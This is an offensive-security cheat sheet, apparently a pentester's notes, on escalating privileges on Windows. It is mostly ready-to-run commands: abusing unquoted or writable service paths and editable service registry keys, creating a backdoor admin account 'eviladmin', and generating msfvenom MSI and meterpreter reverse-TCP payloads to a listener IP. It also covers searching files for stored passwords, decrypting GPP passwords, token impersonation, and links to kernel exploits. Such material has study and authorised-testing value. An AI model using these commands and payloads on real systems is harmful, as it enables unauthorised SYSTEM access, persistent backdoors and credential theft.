# Privilege Escalation

## Options
- Missing Patches
- Automated Deployment and Auto Logon Passwords
- AlwaysInstallElevated (any user can run MSI as SYSTEM)
- Misconfigured Services

## Guides
- https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
- Windows Privilege Escalation Fundamentals: http://www.fuzzysecurity.com/tutorials/16.html

## Tools
- https://github.com/pentestmonkey/windows-privesc-check/raw/master/windows-privesc-check2.exe
- BeRoot: https://github.com/AlessandroZ/BeRoot/tree/master/Windows
- Windows-Exploit-Suggester - https://github.com/GDSSecurity/Windows-Exploit-Suggester
- Check Insecure Services: https://gist.github.com/wdormann/db533d84df57a70e9580a6a2127e33bb

## Metasploit
In 32bit systems:
```
local_exploit_suggester
```

In 64bit systems:
```
search exploit/windows/local
```
## PowerUp

PowerUp to check for all service misconfigurations:
```
Invoke-AllChecks
```

### Service Unquoted Path

```
Get-ServiceUnquoted -Verbose
```

```
Get-WmiObject -Class win32_service | f` *
```

When service path is unquoted:
```
C:\PROGRAM FILES\SUB DIR\PROGRAM NAME
```

Areas we can place files for exploit are marked with *
```
C:\PROGRAM*FILES\SUB*DIR\PROGRAM*NAME
```

Examples:
```
c:\program.exe files\sub dir\program name
c:\program files\sub.exe dir\program name
c:\program files\sub dir\program.exe name
```

### Service binary in a location writable to current user

Replace the binary to gain code execution.

```
Get-ModifiableServiceFile -Verbose
```

### Service can be modified by current user

```
Get-ModifiableService -Verbose
```

## Techniques

### Service Unquoted Path

- `exploit/windows/local/trusted_service_path`

```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```
```
C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe

Leads to running:
C:\Program.exe
C:\Program Files.exe
C:\Program Files (x86)\Program.exe
C:\Program Files (x86)\Program Folder\A.exe
C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
```

Insecure Setup:
```
C:\Windows\System32>sc create "Vulnerable Service" binPath= "C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe" start=auto
C:\Windows\System32>cd C:\Program Files (x86)
C:\Program Files (x86)>mkdir "Program Folder\A Subfolder"
C:\Program Files (x86)>icacls "C:\Program Files (x86)\Program Folder" /grant Everyone:(OI)(CI)F /T
```
### Folder & Service Executable Privileges

- When new folders are created in the root it is writeable for all authenticated users by default. (NT AUTHORITY\Authenticated Users:(I)(M))
- So any application that gets installed on the root can be tampered with by a non-admin user.
    - If binaries load with SYSTEM privileges from this folder it might just be a matter of replacing the binary with your own one.
- https://msdn.microsoft.com/en-us/library/bb727008.aspx

If folder is writable, drop a exe and use "Service Unquoted Path" to execute:
```
icacls "C:\Program Files (x86)\Program Folder"
```

If service exe is writable to everyone, low privilege user can replace the exe with some other binary:
```
icacls example.exe
```

```
F = Full Control
CI = Container Inherit - This flag indicates that subordinate containers will inherit this ACE.
OI = Object Inherit - This flag indicates that subordinate files will inherit the ACE.
```

### Service Permissions

- `exploit/windows/local/service_permissions`

#### Approach 1 - Check permissions of service
```
subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /display
```
If service is editable, change the `ImagePath` to another exe.
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\testuser\AppData\Local\Temp\Payload.exe" /f
```

or create a local admin with:
```
sc config "Vulnerable Service" binpath="net user eviladmin P4ssw0rd@ /add
sc config "Vulnerable Service" binpath="net localgroup Administrators eviladmin /add"
```

#### Approach 2 - Check services a given user can edit
```
accesschk.exe -uwcqv "testuser" *
```

### AlwaysInstallElevated
- `exploit/windows/local/always_install_elevated`

```
[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer]
"AlwaysInstallElevated"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer]
"AlwaysInstallElevated"=dword:00000001
```
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Installing MSI:
```
msiexec /quiet /qn /i malicious.msi
```

Payload Generation:
```
msfvenom -f msi-nouac -p windows/adduser USER=eviladmin PASS=P4ssw0rd@ -o add_user.msi
```
```
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o Payload.exe
msfvenom -f msi-nouac -p windows/exec cmd="C:\Users\testuser\AppData\Local\Temp\Payload.exe" > malicious.msi
```

### Task Scheduler
- On Windows 2000, XP, and 2003 machines, scheduled tasks run as SYSTEM privileges.
- Works only on  Windows 2000, XP, or 2003
- Must have local administrator

```
> net start "Task Scheduler"
> time
> at 06:42 /interactive "C:\Documents and Settings\test\Local Settings\Temp\Payload.exe"
```

### DLL Hijacking (DLL preloading attack or a binary planting attack)
- https://msdn.microsoft.com/en-us/library/windows/desktop/ff919712(v=vs.85).aspx
- Search order: https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx

```
When an application dynamically loads a dynamic-link library without specifying a fully qualified path name, Windows attempts to locate the DLL by searching a well-defined set of directories in a particular order, as described in Dynamic-Link Library Search Order.

The directory from which the application loaded.
The system directory.
The 16-bit system directory.
The Windows directory.
The current directory.
The directories that are listed in the PATH environment variable.
```

- Services running under SYSTEM does not search through user path environment.

Identify processes / services
- Use procman (https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx).
    - Filter `Result` = `NAME NOT FOUND` and `Path` ends with `dll`
- Look at the registry key `ServiceDll` of services (`Parameters`).

#### Windows 7
```
IKE and AuthIP IPsec Keying Modules (IKEEXT) – wlbsctrl.dll
Windows Media Center Receiver Service (ehRecvr) – ehETW.dll
Windows Media Center Scheduler Service (ehSched) – ehETW.dll
```

Can run Media Center services over command line:
```
schtasks.exe /run /I /TN “\Microsoft\Windows\Media Center\mcupdate”
schtasks.exe /run /I /TN “\Microsoft\Windows\Media Center\MediaCenterRecoveryTask”
schtasks.exe /run /I /TN “\Microsoft\Windows\Media Center\ActivateWindowsSearch”
```

#### Windows XP
```
Automatic Updates (wuauserv) – ifsproxy.dll
Remote Desktop Help Session Manager (RDSessMgr) – SalemHook.dll
Remote Access Connection Manager (RasMan) – ipbootp.dll
Windows Management Instrumentation (winmgmt) – wbemcore.dll
```
```
Audio Service (STacSV) – SFFXComm.dll SFCOM.DLL
Intel(R) Rapid Storage Technology (IAStorDataMgrSvc) – DriverSim.dll
Juniper Unified Network Service(JuniperAccessService) – dsLogService.dll
Encase Enterprise Agent – SDDisk.dll
```

#### Migrations

##### CWDIllegalInDllSearch
- Allow user to change DLL search path algorithm

```
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager]
    CWDIllegalInDllSearch
```
1, 2 or ffffffff ?

```
The directory from which the application loaded
32-bit System directory (C:\Windows\System32)
16-bit System directory (C:\Windows\System)
Windows directory (C:\Windows)
[ dlls not loaded ] The current working directory (CWD)            
Directories in the PATH environment variable (system then user)
```
##### SetDllDirectory
- Removes the current working directory (CWD) from the search order

SetDllDirectory(“C:\\program files\\MyApp\\”) :
```
The directory from which the application loaded
[ added ] C:\program files\MyApp\                                    
32-bit System directory (C:\Windows\System32)
16-bit System directory (C:\Windows\System)
Windows directory (C:\Windows)
[ removed ] The current working directory (CWD)             
Directories in the PATH environment variable (system then user)
```

SetDllDirectory("")
```
The directory from which the application loaded
32-bit System directory (C:\Windows\System32)
16-bit System directory (C:\Windows\System)
Windows directory (C:\Windows)
[ removed ] The current working directory (CWD)
Directories in the PATH environment variable (system then user)
```

##### SafeDllSearchMode
- Enabled by default
- Can disable using `[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager]`
- Calling the SetDllDirectory(“”) or SetDllDirectory(“C:\\program files\\MyApp\\”) disables SafeDllSearchMode and uses the search order described for SetDllDirectory.

##### DEV
- LoadLibraryEx (additional argument)
- SetEnvironmentVariable(TEXT(“PATH”),NULL)
- Change default installation folder to C:\Program Files
- Fully qualified path when loading DLLs
- Use SetDllDirectory(“”) API removing the current working directory from the search order
- If software needs to be installed on the root check there are no binaries needing SYSTEM privileges
- If SYSTEM privileges are required then change the ACL’s of the folder
- Remove the path entry from the SYSTEM path variable if not needed

When enabled
```
The directory from which the application loaded
32-bit System directory (C:\Windows\System32)
16-bit System directory (C:\Windows\System)
Windows directory (C:\Windows)
The current working directory (CWD)           
Directories in the PATH environment variable (system then user)
```

When disabled
```
The directory from which the application loaded
[ moved up the list ] The current working directory (CWD)                   
32-bit System directory (C:\Windows\System32)
16-bit System directory (C:\Windows\System)
Windows directory (C:\Windows)   
Directories in the PATH environment variable (system then user)
```

### Stored Credentials
```
C:\unattend.xml
C:\sysprep.inf
C:\sysprep\sysprep.xml
```

```
dir c:\*vnc.ini /s /b /c
dir c:\*ultravnc.ini /s /b /c
dir c:\ /s /b /c | findstr /si *vnc.ini
findstr /si password *.txt | *.xml | *.ini
findstr /si pass *.txt | *.xml | *.ini
```

#### Unattended Installations
- `post/windows/gather/enum_unattend`
- Look for `UserAccounts` tag of `Unattend.xml`, `sysprep.xml` and `sysprep.inf` across the system, including:
```
C:\Windows\Panther\
C:\Windows\Panther\Unattend\
C:\Windows\System32\
C:\Windows\System32\sysprep\
```
- Microsoft appends "Password" to all passwords within Unattend files before encoding them.

#### Group Policy Preferences (GPP)
- `GPP` allows for configuration of Domain-attached machines via `group policy`.
- Domain machines periodically reach out and authenticate to the Domain Controller utilizing the Domain credentials of the `logged-in user` and pull down policies.
- Group Policies for account management are stored on the Domain Controller in `Groups.xml` files buried in the `SYSVOL` folder
- `cpassword` is used to set passwords for the Local Administrator account.
- Password is AES encrypted (https://msdn.microsoft.com/en-us/library/Cc422924.aspx)

- Metasploit: `post/windows/gather/credentials/gpp`
- PowerSploit: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1

```
Get-GPPPassword
Get-NetOU -GUID "{4C86DD57-4040-41CD-B163-58F208A26623}" | %{ Get-NetComputer -ADSPath $_ }
// All OUs connected to policy | List all domain machines tied to OU
```

- Future - Local Administrator Password Solution (LAPS): https://www.microsoft.com/en-us/download/details.aspx?id=46899

### Token Impersonation

PowerSploit / Incognito

List all tokens
```
Invoke-TokenManipulation -ShowAll
```

List all unique and usable tokens
```
Invoke-TokenManipulation -Enumerate
```

Start new process with token of a user
```
Invoke-TokenManipulation -ImpersonateUser -Username "domain\user"
```

Start new process with token of another process
```
Invoke-TokenManipulation -CreateProcess "C:\Windown\system32\WindowsPowerShell\v1.0\PowerShell.exe" -ProcessId 500
```

### Using Kernel Exploit
Installed updates:
```
wmic qfe get Caption,Description,HotFixID,InstalledOn

```
KiTrap0d

## Exploits

### MS16-032 - Secondary Logon to Address Elevation of Privilege
- Win7-Win10 & 2008-2012 - 32/64 bit
- Machine must have 2+ CPU cores

Exploits:
- [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032)
- [http://willgenovese.com/ms16-032-one-liners/](http://willgenovese.com/ms16-032-one-liners/)
- `ms16_032_secondary_logon_handle_privesc`

References
- [https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html](https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html)

### MS11-080 -  Ancillary Function Driver (AfdJoinLeaf)
- XP, 2003 both - 32/64 bit

Exploits:
- [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-080](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-080)
- [https://www.exploit-db.com/exploits/18176](https://www.exploit-db.com/exploits/18176)
- [https://hackingandsecurity.blogspot.com/2016/05/ms11-080-privilege-escalation-windows.html](https://hackingandsecurity.blogspot.com/2016/05/ms11-080-privilege-escalation-windows.html)

```
python py installer module
python pyinsaller.py --onefile example.py
```

### MS12-042 - Windows Kernel - SYSRET
- XP SP3, 2003, 7, 2008 R2

Exploits:
- [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS12-042](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS12-042)
- [https://www.exploit-db.com/exploits/20861](https://www.exploit-db.com/exploits/20861)

### MS15-051 - Windows Kernel-Mode Drivers
- 2003 SP2, Vista SP2, 2008 SP2, 7 SP1, 2008 R2 SP1, 8, 8.1, 2012, 2012 R2, RT, RT 8.1 - 32/64 bit

Exploits:
- [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051)
- [https://www.exploit-db.com/exploits/37049](https://www.exploit-db.com/exploits/37049)
- [https://github.com/hfiref0x/CVE-2015-1701](https://github.com/hfiref0x/CVE-2015-1701)
- `exploit/windows/local/ms15_051_client_copy_image`

References:
- [https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html](https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html)

### MS10-092 - Task Scheduler
- Vista SP1/SP2, 2008, 7 2008 R2 - 32/64bit

Exploits:
- [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-092](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-092)
- `exploit/windows/local/ms10_092_schelevator`

References:
- [https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-092](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-092)
- [http://daveschull.com/wp-content/uploads/2015/05/Stuxnet_Under_the_Microscope.pdf](http://daveschull.com/wp-content/uploads/2015/05/Stuxnet_Under_the_Microscope.pdf)

## References
> - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
> - http://www.greyhathacker.net/?p=738
> - https://toshellandback.com/2015/11/24/ms-priv-esc
> - https://www.toshellandback.com/2015/08/30/gpp/
